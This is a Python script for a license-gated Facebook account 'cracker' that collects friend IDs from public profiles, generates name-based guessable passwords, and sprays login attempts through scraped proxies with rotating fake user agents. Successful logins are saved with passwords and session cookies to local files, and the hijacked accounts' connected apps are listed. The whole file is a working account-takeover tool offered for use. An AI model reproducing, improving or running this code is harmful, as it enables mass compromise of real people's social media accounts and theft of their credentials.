def rx47c():
    import os
    try:
        import requests
    except ImportError:
        os.system('pip install requests')
    import os, requests
    
    uuid = str(os.geteuid()) + str(os.getlogin()) 
    id = "<>".join(uuid)
    print("\n\n\x1b[37;1m  YOUR ID : \033[94m"+id)
    try:
        url = requests.get("https://raw.githubusercontent.com/rx47c/cracker/main/active1.txt").text
    except requests.exceptions.ConnectionError:
        print('No Internet Connection')
    if id in url:
        print("\033[92m  YOUR ID IS ACTIVE.........\033[97m")
    elif id not in url:
        print('\033[0;91mYour Id Not Activate Send Chat To @rx47c')
        exit()
      
rx47c()

# Modul
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
    
    aa='Mozilla/5.0 (Linux; Android 10; SM-A750FN)'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

def MR4X1(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		MRBX = '2008-2009'
	elif len(fx)==8:
		MRBX = '2007-2008'
	elif len(fx)==7:
		MRBX = '2006-2007'
	else:MRBX=''
	return MRBX

import os, platform, time, sys

# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.001)
def clear():
	os.system('clear')
def back():
	login()
# LOGO
def banner():
	clear()
	masud(f'''
\033[0;37m   
''')
# LOGIN
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					tok = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(tok)
					cokiew = open(".cok.txt", "w").write(cok)
					print(f'\n[!] Login  berhasil jalankan ulang perintah nya')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
# MAIN MENU
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('%s[%s✘%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
	#print('        \n    [\033[1;97m\033[1;41m  𝗟𝗢𝗚𝗜𝗡 𝗜𝗡𝗙𝗢   \033[0m\033[1;93m]\n')
	#print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝗬𝗢𝗨𝗥 𝗜𝗗 : "+str(my_id)) 
	#print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝗡𝗔𝗠𝗘    : "+str(my_name))
	#print('        \n    [\033[1;97m\033[1;41m  𝗧𝗥𝗟𝗘𝗚𝗥𝗔𝗠   \033[0m\033[1;93m]\n')
	#print('        \n    [\033[1;97m\033[1;41m  𝗿𝘅47𝗰   \033[0m\033[1;93m]\n')
	#print('\n    [\033[1;97m\033[1;41m  𝗢𝗣𝗧𝗜𝗢𝗡 𝗠𝗘𝗡𝗨   \033[0m\033[1;93m]\n')
	print('\n    [\033[1;97m\033[1;32m  𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 : 𝗿𝘅47𝗰   \033[0m\033[1;93m]\n')
	print('\n    [\033[1;97m\033[38;5;18m  𝗔𝗨𝗧𝗛𝗢𝗥 : 𝗢𝗙𝗙𝗟𝗜𝗡𝗘   \033[0m\033[1;93m]\n')
	print('\n    [\033[1;97m\033[1;33m  𝗖𝗛𝗔𝗡𝗘𝗟 : 𝗡𝗢𝗡𝗘   \033[0m\033[1;93m]\n')
	print('\n    [\033[1;97m\033[38;5;8m  𝗧𝗢𝗢𝗟 𝗦𝗧𝗔𝗧𝗨𝗦 : 𝗣𝗥𝗜𝗖𝗘   \033[0m\033[1;93m]\n')
	print('\n    [\033[1;97m\033[38;5;88m  𝗧𝗢𝗢𝗟 𝗩𝗜𝗥𝗦𝗜𝗢𝗡 : 7.0   \033[0m\033[1;93m]\n')
		
	print('%s[%s1%s]%s PUBLIC CRACKER( %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s FILE CRACKER %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s3%s]%s CREATE | FILE  %s[%sOFF%s]'%(P,H,P,H,P,H,P))	
	print('%s[%sB%s]%s EXIT %s[%sOut%s]'%(P,H,P,H,P,H,P))
	MRBX = input('%s[%s?%s]%s select menu %s : '%(N,H,N,H,M))
	if MRBX in ['1','01']:
		public()
	elif MRBX in ['2','02']:
		File2()
#	elif MRBX in ['3','03']:
#		File3()
	elif MRBX in ['A','a']:
		os.system('xdg-open https://m.me/Kamrul.Vau.143');menu(my_name,my_id)
	elif MRBX in ['B','b']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[] Connection Is Over ')
		exit()
# PUBLIC CRACK
def public():    
 try:
  token = open('.token.txt','r').read()
  cok = open('.cok.txt','r').read()
 except IOError:
     exit()
 try:
     jum = int(input('[?] CRACK ID LIMIT : '))
 except ValueError:
     print('{k}[✘] NOT PUBLIC ID ')
     exit()
 if jum<1 or jum>100:
     print('[✘] Your limit error')
     exit()
 ses=requests.Session()
 yz = 0
 for met in range(jum):
  yz+=1
  kl = input('[➤] INPUT PUBLIC '+str(yz)+' : ')
  uid.append(kl)
 for user in uid:
     try:
        head = (
        {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
        })
        if len(id) == 0:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }           
        )
        else:
            params = (
            {
            'access_token': token,
            'fields': "friends"
            }            
        )
        b = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
        for mi in b['friends']['data']:
            try:
                iso = (mi['id']+'|'+mi['name'])
                if iso in id:pass
                else:id.append(iso)
            except:continue
     except (KeyError,IOError):
       pass
     except requests.exceptions.ConnectionError:
       print('{k}[✘] Error  ')
       exit()
 try:
       print('')
       print(f'[•] Total Id :{b}'+str(len(id))) 
       setting()
 except requests.exceptions.ConnectionError:
     print(f'{u}')
     print('[✘] No Internet connection ')
     exit()
 except (KeyError,IOError):
  print(f'[✘] Not Public  {u}')
  time.sleep(3)
  exit()
#-------------[ FILE - CRACK ]-------------#
def File2():
			try:
				fileX = input ('\n ENTER FILE PATH : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] FILE %s NOT FOUND"%(fileX))
				
#-------------[ FILE - CREATE ]-------------#
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
#	banner()
	if   ['3','03']:
		os.system('3')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
				
	else:
		exit()
#	banner()
	method.append('mobile')
	if ['01','1']:
		os.system('1')
		su()
	
def su():
	bo = random.choice([m,k,h,b,u,p])
	print(f'''
\033[32m[1] 𝗕𝗞𝗔 𝗕𝗢 𝗖𝗥𝗔𝗖𝗞 𝗞𝗥𝗗𝗡
''')
	print("\033[1;32m➣ \033[1;37m 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗 : "+str(len(id)))
	ch = input('! \033[1;97m[\033[1;92m-\033[1;97m] 1 𝗕𝗞𝗔 >> \033[1;97m  ')
	if ch in ['1','01']:
		passwrd()
	elif ch in ['2','02']:
		password2()
	else:
		passwrd()
		password2()
	
# password # 
    
# password 2#
	    
def passwrd():
	os.system('clear')
	#banner()
	print("")
	#print("\033[1;32m➣ \033[1;37m 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗖𝗥𝗔𝗖𝗞 :
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'1122')
					pwv.append(frs+'2007')
					pwv.append(frs+'123123')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'2008')
					pwv.append('12'+frs+'12')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123456789')
					pwv.append('123'+frs+'123')
					pwv.append(frs+'12345678')
					pwv.append('firstlast')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'123')
					pwv.append('12345'+frs)
					pwv.append(frs+'112233445566')
					pwv.append(frs+'2003')
					pwv.append(frs+'123'+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'1122')
					pwv.append(frs+'2007')
					pwv.append(frs+'123123')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'2008')
					pwv.append('12'+frs+'12')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123456789')
					pwv.append('123'+frs+'123')
					pwv.append(frs+'12345678')
					pwv.append('firstlast')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'123')
					pwv.append('12345'+frs)
					pwv.append(frs+'112233445566')
					pwv.append(frs+'2003')
					pwv.append(frs+'123'+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m OK = %s '%(ok))
	print('')
	print(' \033[1;37m CP = %s '%(cp))
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()
	
def password2():
	os.system('clear')
	banner()
	print("")
	#print(f'\033[1;31m➣ \033[1;37m DATE : '+str(dddd)+'-'+str(mmmm)+'-'+str(yyyy)+'')
	#print("\033[1;31m➣ \033[1;37m TOTAL ID : "+str(len(id)))
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'1122')
					pwv.append(frs+'2007')
					pwv.append(frs+'123123')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'2008')
					pwv.append('12'+frs+'12')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123456789')
					pwv.append('123'+frs+'123')
					pwv.append(frs+'12345678')
					pwv.append('firstlast')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'123')
					pwv.append('12345'+frs)
					pwv.append(frs+'112233445566')
					pwv.append(frs+'2003')
					pwv.append(frs+'123'+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'1122')
					pwv.append(frs+'2007')
					pwv.append(frs+'123123')
					pwv.append(frs+'12345')
					pwv.append(frs+'112233')
					pwv.append(frs+'2008')
					pwv.append('12'+frs+'12')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123456789')
					pwv.append('123'+frs+'123')
					pwv.append(frs+'12345678')
					pwv.append('firstlast')
					pwv.append(frs+'2006')
					pwv.append(frs+'2005')
					pwv.append(frs+'2004')
					pwv.append(frs+'123')
					pwv.append('12345'+frs)
					pwv.append(frs+'112233445566')
					pwv.append(frs+'2003')
					pwv.append(frs+'123'+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crackmobile_MRBX,idf,pwv,nmf)
			elif 'mbasic' in method:
				pool.submit(crackmbasic_MRBX,idf,pwv,nmf)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(' \033[1;34m OK = %s '%(ok))
	print('')
	print(' \033[1;37m CP = %s '%(cp))
	print('\033[1;34mBO DUBARA CRACK KRDN [CTRL + P] DAGRA')
	exit()

# Mobile 
def crackmobile_MRBX(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r \x1b[1;96m[  \x1b[1;96m𝗥𝗘𝗗𝗔-𝗩7  \x1b[1;95m{loop}\x1b[1;91m＋\x1b[1;94m{len(id)}  \x1b[1;92mOK:{ok}  \x1b[1;93mCP:{cp}  ]"),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update = {'Host':'p.facebook.com',
 'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'sec-ch-ua': '"Google Chrome";v="111", "Chromium";v="111", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/login/save-device/'"}
            ses.headers.update = {'Host': 'm.facebook.com',
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2',
    'referer': 'https://www.google.com/',
    'sec-ch-ua': '"Google Chrome";v="105", "Chromium";v="105", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\n[𝗖𝗣]\n[𝗨𝗜𝗗] {idf}\n(𝗣𝗔𝗦𝗦) {pw}{N}')
                open('/sdcard/REDA-CPk.txt','a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{H}\n[𝗥𝗘𝗗𝗔 𝗢𝗞]\n(𝗜𝗗) {idf}\n(𝗣𝗔𝗦𝗦) {pw}\n(𝗖𝗢𝗢𝗞𝗜𝗘𝗦){kuki}{N}')
                open('/sdcard/𝗥𝗘𝗗𝗔-𝗢𝗞.txt','a').write(idf+' • '+pw+'\n')
                cek_NIK(kuki)
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_NIK(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

# 							[ approval ] 								#
def reg():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
    banner()
    print ('')
    print ('                  [\033[1;97m\033[1;41m wait a minute \033[0m\033[1;93m]')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.mrbx.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://raw.githubusercontent.com/mrbx001/approval.txt/main/mrbx').text
    if to in r:
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
        banner()
        print('      [\033[1;97m\033[1;41m  YOU NEED APPROVAL    \033[0m\033[1;93m]')
        print ('\n               YOUR KEY : \n' + to)
        print('      [\033[1;97m\033[1;41m  YOUR KEY SENT TO ADDMIN    \033[0m\033[1;93m]')
        name = input("               YOUR NAME : ")
        input('                     [\033[1;97m\033[1;41m  CLICK INTER   \033[0m\033[1;93m]')
        time.sleep(3.5)
        os.system('xdg-open https://m.me/it.is.Masudvai.143')
  
  
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
